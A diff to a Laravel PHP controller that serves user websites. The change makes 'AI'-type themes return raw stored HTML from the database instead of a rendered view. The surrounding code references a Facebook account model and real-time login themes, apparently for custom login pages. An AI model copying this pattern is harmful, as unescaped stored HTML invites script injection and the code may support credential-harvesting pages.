@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Models\FbAccount;
+use App\Models\CustomTheme as CustomThemeModel;
 use App\Models\User;
 use App\Models\Website;
 use Illuminate\Http\Request;
@@ -31,7 +32,14 @@ class CustomWeb extends Controller
             return view('init', ['data' => $web_data, 'info' => $web_info]);
         } else {
             if (!$rq->exists('l')) {
-                return view('custom.user.' . $web_data->theme_folder, ['data' => $web_data, 'setting' => $user_settings, 'input' => $web_data->theme_input, 'pusher_code' => $pusher_code, 'info' => $web_info]);
+                $custom_theme = CustomThemeModel::where('folder', $web_data->theme_folder)->first();
+                if ($custom_theme) {
+                    # nếu giao diện là AI
+                    if ($custom_theme->type == 'ai') {
+                        return $custom_theme->html;
+                    }
+                }
+                return view('custom.user.' . $web_data->theme_folder, ['data' => $web_data, 'input' => $web_data->theme_input, 'pusher_code' => $pusher_code]);
             } else {
                 return view('login.realtime.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings, 'type' => 'custom', 'pusher_code' => $pusher_code]);
             }
